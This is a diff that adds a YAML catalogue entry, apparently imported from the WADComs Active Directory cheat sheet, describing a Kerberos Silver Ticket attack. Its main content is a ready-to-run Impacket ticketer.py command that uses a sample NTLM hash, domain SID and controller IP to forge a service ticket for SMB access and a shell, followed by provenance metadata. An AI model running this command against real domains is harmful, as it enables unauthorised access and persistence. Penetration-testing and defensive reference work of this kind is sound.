@@ -1,0 +1,103 @@
+id: wadcoms/Impacket-SilverTicket
+type: technique
+platform: active-directory
+name: Impacket SilverTicket
+phases:
+- execution
+- persistence
+capabilities:
+- command-execution
+- persistence
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+- an NTLM hash (pass-the-hash)
+commands:
+- template: python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775
+    -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
+  comment: "Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket\
+    \ for a specific service using a valid user's NTLM hash. It is then possible to gain access to that\
+    \ service. The following command crafts a TGS for the SMB service, which can then be used to gain\
+    \ a shell.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername:\
+    \ john\n\n\tHash: b18b4b218eccad1c223306ea1916885f\n\n\tDomain SID: S-1-5-21-1339291983-1349129144-367733775\n\
+    \n\tSMB Service: cifs\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
+- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-SilverTicket.md
+      document: "---\ndescription: |\n  Impacket's ticketer.py can perform Silver Ticket attacks, which\
+        \ crafts a valid TGS ticket for a specific service using a valid user's NTLM hash. It is then\
+        \ possible to gain access to that service. The following command crafts a TGS for the SMB service,\
+        \ which can then be used to gain a shell.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\
+        \n  \tDomain: test.local\n\n  \tUsername: john\n\n  \tHash: b18b4b218eccad1c223306ea1916885f\n\
+        \n  \tDomain SID: S-1-5-21-1339291983-1349129144-367733775\n\n  \tSMB Service: cifs\n\ncommand:\
+        \ |\n  python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775\
+        \ -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john\nitems:\n  - Username\n  - Hash\n\
+        services:\n  - Kerberos\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n  - Persistence\n\
+        references:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py\n\
+        \  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:c3eb78d0924c6108c657cbeca68e55c3f7a8c4840f678fa2d8eeebadf4264fef
